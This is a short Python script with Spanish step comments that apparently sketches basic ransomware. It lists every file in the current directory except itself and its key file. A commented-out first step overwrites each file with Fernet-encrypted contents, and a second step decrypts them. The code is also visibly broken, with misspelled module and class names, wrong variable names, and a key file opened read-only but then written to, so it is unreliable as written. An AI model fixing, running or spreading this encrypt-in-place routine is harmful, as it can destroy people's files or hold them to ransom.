import os 
from crytography.fernet import Fernet

files = []

for file in so.listdir():
    if file == "Codigo.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        file.append(file)

print(files)

#Paso 2

"""

with open("thekey.key", "rb") as key:
    secretkey = key.read()

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_decrypted = Fernet(secretkey).decrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_decrypted)

        

"""

#Paso 1

"""

key = Fernte.generate_key()
with open("thekey.key", "rb") as key:
    thefile.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

"""